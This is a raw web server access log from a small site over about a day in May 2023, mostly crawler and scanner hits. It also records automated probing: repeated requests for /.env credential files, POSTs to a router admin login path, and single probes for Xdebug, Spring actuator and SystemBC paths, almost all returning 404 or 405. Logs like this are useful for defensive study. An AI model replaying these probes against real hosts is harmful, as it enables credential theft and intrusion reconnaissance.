66.249.69.202 - - [12/May/2023:11:22:00 +0000] "GET /Pipfile HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.196 - - [12/May/2023:11:43:55 +0000] "GET /about HTTP/1.1" 200 2235 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.199 - - [12/May/2023:12:03:18 +0000] "GET /about HTTP/1.1" 200 2235 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.79.29.48 - - [12/May/2023:12:26:09 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:12:26:09 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
81.166.58.249 - - [12/May/2023:12:27:54 +0000] "GET /output.css HTTP/1.1" 404 419 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [12/May/2023:12:27:54 +0000] "GET /pool.jpg HTTP/1.1" 404 419 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [12/May/2023:12:27:54 +0000] "GET /logo.jpg HTTP/1.1" 404 419 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [12/May/2023:12:27:55 +0000] "GET /logo.jpg HTTP/1.1" 404 418 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
66.249.69.199 - - [12/May/2023:13:18:20 +0000] "GET /about.html HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
87.121.221.49 - - [12/May/2023:13:23:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://35.226.208.247:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.233.19.78 - - [12/May/2023:13:25:13 +0000] "GET / HTTP/1.1" 200 6584 "-" "-"
205.210.31.195 - - [12/May/2023:13:32:42 +0000] "GET / HTTP/1.1" 200 6584 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
51.79.29.48 - - [12/May/2023:13:33:10 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:13:33:11 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.134.49.180 - - [12/May/2023:13:35:34 +0000] "GET / HTTP/1.1" 200 6584 "-" "-"
43.134.49.180 - - [12/May/2023:13:36:18 +0000] "GET /.env HTTP/1.1" 404 419 "-" "python-requests/2.30.0"
43.134.49.180 - - [12/May/2023:13:36:38 +0000] "POST / HTTP/1.1" 405 401 "-" "python-requests/2.30.0"
51.79.29.48 - - [12/May/2023:14:05:06 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:14:05:06 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.69.199 - - [12/May/2023:15:02:11 +0000] "GET /db.py HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
23.98.133.164 - - [12/May/2023:15:30:48 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.98.133.164 - - [12/May/2023:15:30:49 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:15:42:55 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:15:42:55 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.69.202 - - [12/May/2023:16:01:08 +0000] "GET /robots.txt HTTP/1.1" 404 419 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.202 - - [12/May/2023:16:01:08 +0000] "GET /pisscounter.conf HTTP/1.1" 404 418 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.202 - - [12/May/2023:16:12:44 +0000] "GET /logon HTTP/1.1" 200 1690 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.79.29.48 - - [12/May/2023:16:52:52 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:16:52:52 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.203.210.113 - - [12/May/2023:17:36:34 +0000] "GET / HTTP/1.1" 200 6584 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
181.66.164.26 - - [12/May/2023:18:12:08 +0000] "GET / HTTP/1.1" 200 6584 "-" "-"
51.79.29.48 - - [12/May/2023:18:12:55 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:18:12:55 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
223.247.178.167 - - [12/May/2023:18:22:16 +0000] "GET / HTTP/1.1" 200 2113 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
66.249.72.6 - - [12/May/2023:19:18:31 +0000] "GET /geckodriver.log HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.72.10 - - [12/May/2023:19:23:29 +0000] "GET /icons/script.gif HTTP/1.1" 304 248 "-" "Googlebot-Image/1.0"
141.98.6.151 - - [12/May/2023:19:48:51 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://35.226.208.247:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
128.199.7.70 - - [12/May/2023:20:45:13 +0000] "GET /systembc/ HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
152.89.196.144 - - [12/May/2023:20:57:08 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 2113 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [12/May/2023:21:01:44 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:21:01:44 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [12/May/2023:21:03:41 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
81.166.58.249 - - [12/May/2023:21:07:01 +0000] "GET /output.css HTTP/1.1" 404 419 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [12/May/2023:21:07:01 +0000] "GET /pool.jpg HTTP/1.1" 404 419 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [12/May/2023:21:07:01 +0000] "GET /logo.jpg HTTP/1.1" 404 419 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [12/May/2023:21:07:02 +0000] "GET /logo.jpg HTTP/1.1" 404 418 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
66.249.72.10 - - [12/May/2023:21:36:36 +0000] "GET / HTTP/1.1" 200 2150 "http://pisscounter.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.79.29.48 - - [12/May/2023:21:40:31 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:21:40:31 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
81.166.58.249 - - [12/May/2023:21:57:25 +0000] "GET /logo.jpg HTTP/1.1" 404 363 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [12/May/2023:21:57:25 +0000] "GET /output.css HTTP/1.1" 404 363 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [12/May/2023:21:57:25 +0000] "GET /pool.jpg HTTP/1.1" 404 363 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
81.166.58.249 - - [12/May/2023:21:57:26 +0000] "GET /logo.jpg HTTP/1.1" 404 363 "http://35.226.208.247/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition std-1)"
128.14.141.34 - - [12/May/2023:22:05:34 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
152.89.196.144 - - [12/May/2023:22:11:57 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
205.210.31.2 - - [12/May/2023:23:09:10 +0000] "GET / HTTP/1.1" 200 6584 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
103.169.35.15 - - [12/May/2023:23:11:10 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.169.35.15 - - [12/May/2023:23:11:10 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.72.6 - - [12/May/2023:23:16:45 +0000] "GET / HTTP/1.1" 200 2150 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.72.6 - - [12/May/2023:23:16:52 +0000] "GET /package.json HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
140.246.136.252 - - [12/May/2023:23:22:09 +0000] "GET / HTTP/1.1" 200 2113 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
66.249.72.6 - - [12/May/2023:23:29:30 +0000] "GET /Pipfile.lock HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
179.43.177.243 - - [12/May/2023:23:38:26 +0000] "GET / HTTP/1.1" 200 6584 "-" "Hello World"
51.79.29.48 - - [12/May/2023:23:56:09 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:23:56:09 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:23:59:03 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2023:23:59:03 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.131.24 - - [13/May/2023:00:02:41 +0000] "GET /card HTTP/1.1" 404 363 "Bing" "Bing"
103.169.35.15 - - [13/May/2023:00:05:10 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.169.35.15 - - [13/May/2023:00:05:10 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
87.121.221.49 - - [13/May/2023:00:12:45 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://35.226.208.247:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
207.241.235.229 - - [13/May/2023:00:23:54 +0000] "GET /robots.txt HTTP/1.0" 404 382 "-" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)"
207.241.235.229 - - [13/May/2023:00:23:54 +0000] "GET /robots.txt HTTP/1.0" 404 382 "-" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)"
207.241.235.229 - - [13/May/2023:00:23:54 +0000] "GET /static/logo.jpg HTTP/1.0" 200 20524 "http://35.226.208.247/" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)"
207.241.235.229 - - [13/May/2023:00:23:54 +0000] "GET /static/pool.jpg HTTP/1.0" 200 288104 "http://35.226.208.247/" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)"
207.241.235.229 - - [13/May/2023:00:23:55 +0000] "GET /static/output.css HTTP/1.0" 200 217537 "http://35.226.208.247/" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)"
23.98.133.164 - - [13/May/2023:00:33:32 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.98.133.164 - - [13/May/2023:00:33:32 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.243 - - [13/May/2023:00:49:34 +0000] "GET / HTTP/1.1" 200 6584 "-" "Hello World"
35.187.98.121 - - [13/May/2023:00:50:00 +0000] "GET / HTTP/1.1" 200 2150 "-" "python-requests/2.28.2"
104.199.31.214 - - [13/May/2023:01:57:22 +0000] "GET / HTTP/1.1" 200 2150 "-" "python-requests/2.28.2"
20.55.58.5 - - [13/May/2023:02:12:11 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.55.58.5 - - [13/May/2023:02:12:11 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2023:02:46:09 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2023:02:46:09 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2023:03:22:41 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2023:03:22:41 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.72.10 - - [13/May/2023:03:33:12 +0000] "GET / HTTP/1.1" 200 2150 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
3.21.53.255 - - [13/May/2023:03:58:04 +0000] "GET / HTTP/1.1" 200 2113 "-" "Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1 Iceweasel/14.0.1"
3.21.53.255 - - [13/May/2023:04:27:07 +0000] "GET / HTTP/1.1" 200 2113 "-" "Mozilla/5.0 (Linux; Android 5.1; OPPO A59s Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044813 Mobile Safari/537.36 MMWEBID/6148 MicroMessenger/7.0.6.1460(0x27000634) Process/tools NetType/WIFI Language/zh_CN"
162.142.125.223 - - [13/May/2023:04:30:30 +0000] "GET / HTTP/1.1" 200 6584 "-" "-"
162.142.125.223 - - [13/May/2023:04:30:30 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.223 - - [13/May/2023:04:30:30 +0000] "GET /logo.jpg HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.223 - - [13/May/2023:04:30:30 +0000] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
51.79.29.48 - - [13/May/2023:05:20:35 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2023:05:20:35 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.243 - - [13/May/2023:05:21:21 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://35.226.208.247:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
167.248.133.36 - - [13/May/2023:05:53:13 +0000] "GET / HTTP/1.1" 200 6584 "-" "-"
167.248.133.36 - - [13/May/2023:05:53:13 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.36 - - [13/May/2023:05:53:13 +0000] "GET /logo.jpg HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.36 - - [13/May/2023:05:53:13 +0000] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
51.79.29.48 - - [13/May/2023:07:01:32 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2023:07:01:32 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.94.145.57 - - [13/May/2023:07:41:04 +0000] "GET / HTTP/1.1" 200 6584 "-" "-"
167.94.145.57 - - [13/May/2023:07:41:05 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.57 - - [13/May/2023:07:41:05 +0000] "GET /logo.jpg HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.57 - - [13/May/2023:07:41:05 +0000] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
51.79.29.48 - - [13/May/2023:08:02:11 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2023:08:02:11 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.38.237.172 - - [13/May/2023:08:39:43 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://35.226.208.247:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
59.98.181.120 - - [13/May/2023:09:33:26 +0000] "GET / HTTP/1.1" 200 6584 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
103.116.52.146 - - [13/May/2023:09:37:42 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://35.226.208.247:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
51.79.29.48 - - [13/May/2023:10:15:50 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2023:10:15:50 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.1.248.26 - - [13/May/2023:10:22:00 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
172.104.11.4 - - [13/May/2023:11:00:59 +0000] "GET / HTTP/1.1" 200 2094 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
103.38.237.172 - - [13/May/2023:11:11:18 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://35.226.208.247:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
66.249.72.6 - - [13/May/2023:11:16:33 +0000] "GET /robots.txt HTTP/1.1" 404 419 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.72.10 - - [13/May/2023:11:16:33 +0000] "GET /__pycache__/ HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
34.77.127.183 - - [13/May/2023:11:21:01 +0000] "GET / HTTP/1.1" 200 2150 "-" "python-requests/2.28.2"
66.249.72.14 - - [13/May/2023:11:30:15 +0000] "GET /README.md HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.142 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
20.55.58.5 - - [13/May/2023:11:38:45 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
